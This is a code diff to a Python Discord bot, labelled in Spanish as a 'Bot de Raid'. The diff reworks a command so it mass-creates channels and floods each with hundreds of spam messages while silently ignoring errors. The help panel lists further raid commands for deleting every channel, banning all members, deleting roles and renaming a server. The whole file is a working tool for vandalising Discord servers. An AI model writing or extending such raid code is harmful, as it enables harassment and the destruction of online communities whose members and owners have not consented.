@@ -128,22 +128,42 @@ async def ping(ctx):
 
 @bot.command()
 @commands.has_permissions(manage_channels=True)
-async def ret(ctx, cantidad: int = 300):
+async def ret(ctx, cantidad: int = 100):
     nombre_base = "NOMBRE DE LOS CANALES"
     mensaje = "MENSAJE DE SPAM"
+    mensajes_por_canal = 400
 
     if cantidad > 500:
         return
+
+    canales_nuevos = []
 
     for i in range(1, cantidad + 1):
         nombre = f"{nombre_base}-{i}"
         try:
             canal = await ctx.guild.create_text_channel(name=nombre)
-            await canal.send(mensaje)
-            await asyncio.sleep(0)
-        except Exception as e:
-            await ctx.send(f"Error en `{nombre}`: {e}")
+            canales_nuevos.append(canal)
 
+            tareas = [
+                asyncio.create_task(enviar_mensajes(c, mensaje, mensajes_por_canal))
+                for c in canales_nuevos
+            ]
+            asyncio.create_task(asyncio.gather(*tareas))
+
+            await asyncio.sleep(0)
+
+        except discord.Forbidden:
+            await ctx.send("No tengo permisos para crear canales.")
+            return
+        except Exception:
+            pass
+async def enviar_mensajes(canal, mensaje, cantidad):
+    for _ in range(cantidad):
+        try:
+            await canal.send(mensaje)
+            await asyncio.sleep(0.5)
+        except:
+            pass
 @bot.command()
 @commands.has_permissions(ban_members=True)
 async def bn(ctx):
@@ -245,28 +265,29 @@ async def hlp(ctx):
     )
 
     embed.add_field(
-        name="Canal",
-        value="`$clearall` – Borra todos los mensajes de un solo canal\n`$resetcanal` – resetea un canal borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.\n`$resetserver` – resetea TODOS los canales del servidor borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.",
+        name="ℹ️ Canal",
+        value="`$clearall` – \n *Borra todos los mensajes de un solo canal*\n`$resetcanal` – \n *resetea un canal borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.*\n`$resetserver` – \n *Resetea TODOS los canales del servidor borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.*",
         inline=False
     )
 
     embed.add_field(
         name="ℹ️ Raid Info",
-        value="`$spam` – Hace spam en todos los canales.\n`$raid` – Crea una cantidad personalizada de canales.\n`$nuke` – Borra todos los canales del servidor.\n`$cn` – Crea un nuevo nombre al servidor.\n`$cr` – Crea una cantidad de roles en el servidor.\n`$ci <Adjunta una imagen>` – Crea una nueva foto para el servidor.\n`$ret` – Raidea el servidor creando una cantidad absurda de canales con un nombre y mensaje de spam personalizado.\n`$bn` – Banea a todos los miembros del servidor excepto a los bots con administrador.",
+        value="`$spam` – \n *Hace spam en todos los canales.*\n`$raid` – \n *Crea una cantidad personalizada de canales.*\n`$nuke` – \n *Borra todos los canales del servidor.*\n`$cn` – \n *Crea un nuevo nombre al servidor.*\n`$cr` – \n *Crea una cantidad de roles en el servidor.*\n`$ci <Adjunta una imagen>` – \n *Crea una nueva foto para el servidor.*\n`$ret` – \n *Raidea el servidor creando una cantidad absurda de canales con un nombre y mensaje de spam personalizado.*\n`$bn` – \n *Banea a todos los miembros del servidor excepto a los bots con administrador.*\n`$dr` – \n *Borra todos los roles del servidor Excepto los que tienen administrador.*",
         inline=False
     )
 
     embed.add_field(
         name="ℹ️ Ayuda",
-        value="`$hlp` – Muestra este panel de ayuda de comandos\n`$ping` – Mostrar la latencia del bot\n - ***Recuerda que el bot debe ser activado por su creador. También Necesitas modificar el codigo de el archivo.py para poder elegir el nombre de Spam, nombre de canales y el nombre del servidor, osea, este codigo está echo para que ya usen un texto ya predefinido por cada comando.***.",
+        value="`$hlp` – \n *Muestra este panel de ayuda de comandos, el que estás viendo ahora mismo*\n`$ping` – \n *Muestra la latencia del bot*\n - ***Recuerda que el bot debe ser activado por su creador. También Necesitas modificar el codigo de el archivo.py para poder elegir el nombre de Spam, nombre de canales y el nombre del servidor, osea, este codigo está echo para que ya usen un texto ya predefinido por cada comando.***",
         inline=False
     )
 
-    embed.set_footer(text="Bot de Raid")
+    embed.set_footer(text="Bot de Raid, Chuyin")
     await ctx.send(embed=embed)
 
 @bot.event
 async def on_ready():
     print(f'Bot conectado como {bot.user}')
+
 
 bot.run("TOKEN DEL BOT DE DISCORD")
